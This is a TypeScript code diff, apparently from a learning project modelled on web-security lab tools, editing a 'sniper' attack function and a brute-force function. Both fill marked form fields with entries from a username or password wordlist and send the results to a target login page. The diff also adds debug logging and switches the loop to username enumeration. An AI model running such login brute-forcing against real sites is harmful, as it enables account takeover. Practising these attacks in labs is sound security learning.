@@ -38,7 +38,7 @@ export const sniperAttackTemplate = async (
 	formTargetURL: string,
 	formData: string,
 	formDiscriminator: string,
-	payloadSRC: string,
+	payloadSRC?: string,
 	formHeader?: string,
 ) => {
 	/**
@@ -49,26 +49,31 @@ export const sniperAttackTemplate = async (
 	 */
 	// Target URL (example: 'https:google.com')
 	const target: string = formTargetURL;
+	console.log('target ' + target);
 	// Body Data with marked payload positions (example: 'username=$test$&password=pass')
 	const data: string = formData;
+	console.log('data ' + data);
 	// Payload Discriminator (example: '$')
 	const discriminator: string = formDiscriminator;
+	console.log('discriminator ' + discriminator);
 	const regexForPayload = new RegExp(`\\${discriminator}(\\w+)\\${discriminator}`, 'g');
+	console.log('regexForPayload ' + regexForPayload);
 	// Headers (example: 'Content-Type': 'application/json' 'X-Forwarded-For': `129.0.0.X`)
-	let config: AxiosRequestConfig = {}
+	let config: AxiosRequestConfig = {};
 	if (formHeader) {
 		const extractedHeaders = formHeader.split('\r\n');
 		config = {
-			headers: {extractedHeaders},
+			headers: { extractedHeaders },
 		};
-		//config.headers = extractedHeaders;
+		// config.headers = extractedHeaders;
 	}
 
 	/**
 	 * Payload Parameters
 	 */
 	// Payload File (List)
-	const payload: string[] = readFileSync(`${payloadSRC}`).toString().split('\n');
+	const payload: string[] = readFileSync('src/payloads/usernames.txt').toString().split('\n');
+	console.log('payload ' + payload);
 
 	/**
 	 * Ressource Pool Parameters
@@ -79,14 +84,14 @@ export const sniperAttackTemplate = async (
 	/**
 	 * Option Parameters
 	 */
-	//Regex Extract
+	// Regex Extract
 	const extractRegexStart: string = '-warning>';
 	const extractRegexEnd: string = '</p>';
 	const extractRegex: string = (extractRegexStart + '(.*?)' + extractRegexEnd);
 	let extractedData: string = ''; // initialize for later change
 	let extractedDataCache: string = ''; // initialize for later change
 
-	// Information about oncurring attack 
+	// Information about oncurring attack
 	let foundPayloads = null;
 	if (data.match(regexForPayload) === null) {
 		foundPayloads = [];
@@ -148,7 +153,7 @@ Response Time: ${requestDuration}
 			extractedDataCache = extractedData;
 		}
 	}
-}
+};
 
 export const bruteForceAttack = async (targetURL: string, payloadFile?: string) => {
 
@@ -166,8 +171,8 @@ export const bruteForceAttack = async (targetURL: string, payloadFile?: string) 
 	// if (payloadUsernames.length == payloadPasswords.length) return;
 
 	for (let i = 0; i < payloadUsernames.length; i++) {
-		// const data: string = `username=${payloadUsernames[i]}&password=pass`;
-		const data: string = `username=apps&password=${payloadPasswords[i]}`;
+		const data: string = `username=${payloadUsernames[i]}&password=pass`;
+		// const data: string = `username=apps&password=${payloadPasswords[i]}`;
 		// const data: string = 'username=wiener&password=peter';
 		config = {
 			headers: {
